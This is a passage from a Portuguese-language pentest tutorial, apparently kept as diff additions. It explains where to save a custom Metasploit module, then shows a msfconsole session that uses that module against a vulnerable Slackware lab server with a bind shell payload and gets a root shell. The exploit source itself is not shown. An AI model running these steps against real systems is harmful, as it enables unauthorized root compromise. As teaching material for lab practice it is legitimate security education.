+
+- Salvando o exploit no diretorio correto.
+
+Crie um diretorio somente para testes como no meu caso o diretorio pwned.
+
+/pentest/exploits/framework3/modules/exploits/linux/pwned/slackware_servidor_vulneravel.rb
+
+
+
+3.2 - Executando metasploit e explorando a falha.
+
+
+pirate@0x90:/pentest/exploits/framework3 > ./msfconsole
+
+                __.                       .__.        .__. __.
+  _____   _____/  |______    ____________ |  |   ____ |__|/  |_
+ /     \_/ __ \   __\__  \  /  ___/\____ \|  |  /  _ \|  \   __\
+|  Y Y  \  ___/|  |  / __ \_\___ \ |  |_> >  |_(  <_> )  ||  |
+|__|_|  /\___  >__| (____  /____  >|   __/|____/\____/|__||__|
+      \/     \/          \/     \/ |__|
+
+
+       =[ metasploit v3.3.4-dev [core:3.3 api:1.0]
++ -- --=[ 504 exploits - 225 auxiliary
++ -- --=[ 192 payloads - 23 encoders - 8 nops
+       =[ svn r8074 updated 46 days ago (2010.01.05)
+
+
+msf > search pwned
+[*] Searching loaded modules for pattern 'pwned'...
+
+Exploits
+========
+
+   Name                                       Rank    Description
+   ----                                       ----    -----------
+   linux/pwned/apache_error_logpoison         normal  Apache log injection
+   linux/pwned/php_dns_digger                 normal  (DNS Tools) PHP Digger Execucao remota de comandos
+   linux/pwned/slackware_servidor_vulneravel  great   Exploit para servidor vulneravel
+   linux/pwned/tinyweb_lfi_execution          normal  TinyWebGallery 1.7.6 LFI Execucao remota de comandos
+
+
+msf > use linux/pwned/slackware_servidor_vulneravel
+msf exploit(slackware_servidor_vulneravel) > set RHOST 192.168.77.128
+RHOST => 192.168.77.128
+msf exploit(slackware_servidor_vulneravel) > set PAYLOAD linux/x86/shell_bind_tcp
+linux/x86/shell_bind_tcp
+msf exploit(slackware_servidor_vulneravel) > exploit  
+
+[*] Started bind handler
+[*] Sending 500 byte payload...
+[*] Blk ht c0rp
+[*] Exploiting Linux Slackware 8.1....
+[*] Command shell session 1 opened (192.168.77.1:56615 -> 192.168.77.128:4444)
+
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+uname -a
+Linux slackware 
+pwd
+/tmp
+
+
+
+
+------ F I M --------
+
+Conclusão: Espero que gostem do tutorial e desculpe pelos bugs de "Português" ;).
+greetz: Para todos hackers e penetration testers brasileiros em atividade.
+
+
+Referências: 
+http://www.cic.unb.br/~pedro/trabs/buffer_overflow.htm   [ servidor vulneravel ]
+http://pt.wikipedia.org/wiki/Exploit                     [ definição de exploits ]
+http://pt.wikipedia.org/wiki/Transbordamento_de_dados    [ definição buffer overflows ]
+http://www.owasp.org/index.php/Buffer_Overflow           [ buffer overflows exemplos ]
+http://www.offensive-security.com/metasploit-unleashed   [ otima tutorial sobre o metasploit ]
